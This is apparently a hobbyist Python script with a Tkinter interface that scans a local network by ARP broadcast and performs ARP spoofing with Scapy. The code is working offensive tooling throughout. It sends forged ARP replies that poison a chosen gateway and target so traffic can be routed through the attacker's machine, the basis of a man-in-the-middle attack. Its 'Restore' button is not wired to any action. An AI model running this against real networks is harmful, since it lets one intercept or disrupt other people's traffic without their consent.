import scapy.all as scapy
import optparse # very old but just for try
from tkinter import *
import tkinter as tk
import tkinter.messagebox


class Application:
    def __init__(self, master):
        self.master = master
        self.master.title('Network scanning')
        self.left = Frame(self.master, width=800, height=720, bg="lightgreen")
        self.left.pack(side=LEFT)
        self.right = Frame(self.master, width=400, height=720, bg="steelblue")
        self.right.pack(side=RIGHT)
        self.heading = Label(self.left, text="Network Scanning", font=('arial 30 bold'))
        self.heading.place(x=0, y=0)
        self.ip = tk.Label(self.master, text="IP", font=("arial 18 bold"), fg='black', bg='lightgreen')
        self.ip.pack()
        self.ip_ent = tk.Entry(self.master)
        self.ip_ent.pack()

        self.spoofgateway = tk.Label(self.master, text="gatewaynumber", font=("arial 18 bold"), fg='black')
        self.spoofgateway.pack()

        self.spoofgatewayEntry = tk.Entry(self.master)
        self.spoofgatewayEntry.pack()

        self.spooftarget = tk.Label(self.master, text="targetnumber", font=("arial 18 bold"), fg='black')
        self.spooftarget.pack()

        self.spooftargetEntry = tk.Entry(self.master)
        self.spooftargetEntry.pack()

        self.scan_bott = tk.Button(self.left, width=20, text="Scan", command=self.scaner)
        self.scan_bott.pack()

        self.spoof_bott = tk.Button(self.left, width=20, text="Spoof", command=self.spoof_devices)
        self.spoof_bott.pack()

        self.restore_bott = tk.Button(self.left, width=20, text="Restore")
        self.restore_bott.pack()

        self.out_put = tk.Text(self.master)
        self.out_put.pack()

        # Initialize the gateway and target IP addresses to None
        self.gateway_ip = None
        self.target_ip = None



    def are(self): # not Needed
        self.press = optparse.OptionParser()
        self.press.add_option('-i', "--ip", dest="ip" , help='write the target ip ')
        self.nor, self.norr = self.press.parse_args()
        return self.nor

    def scaner(self):
        value = self.ip_ent.get()
        # Use Scapy to scan the network and get a list of IP and MAC addresses
        scapy_arp = scapy.ARP(pdst=value)
        scapy_ethernet = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')
        the_packet = scapy_ethernet / scapy_arp
        response, unresponse = scapy.srp(the_packet, timeout=1)
        devices = []
        for packet in response:
            thedic_ip_mac = {"IP": packet[1].psrc, "MAC": packet[1].hwsrc}
            devices.append(thedic_ip_mac)

        # Store the list of devices as an instance variable
        self.devices = devices

        # Display the list of IP and MAC addresses in the text widget
        self.out_put.delete("1.0", tk.END)
        for item in devices:
            self.out_put.insert(tk.END, f"IP: {item['IP']}\tMAC: {item['MAC']}\n")

    def spoof_devices(self):
        if not self.devices:
            tkinter.messagebox.showerror("Error", "Please scan the network first")
            return

        self.gateway_ip = self.spoofgatewayEntry.get()
        self.target_ip = self.spooftargetEntry.get()

        # Get the MAC addresses of the gateway and target devices from the devices list
        gateway_mac = None
        target_mac = None
        for device in self.devices:
            if device["IP"] == self.gateway_ip:
                gateway_mac = device["MAC"]
            elif device["IP"] == self.target_ip:
                target_mac = device["MAC"]

        if not gateway_mac or not target_mac:
            tkinter.messagebox.showerror("Error", "Could not find the MAC address of the gateway or target device")
            return

        # Send spoofed ARP packets to the gateway and target devices
        gateway_packet = scapy.ARP(op=2, pdst=self.gateway_ip, hwdst=gateway_mac, psrc=self.target_ip)
        target_packet = scapy.ARP(op=2, pdst=self.target_ip, hwdst=target_mac, psrc=self.gateway_ip)
        scapy.send(gateway_packet, verbose=False)
        scapy.send(target_packet, verbose=False)

        tkinter.messagebox.showinfo("Success", "ARP spoofing completed")


if __name__ == "__main__":
    root = tk.Tk()
    app = Application(root)
    root.mainloop()
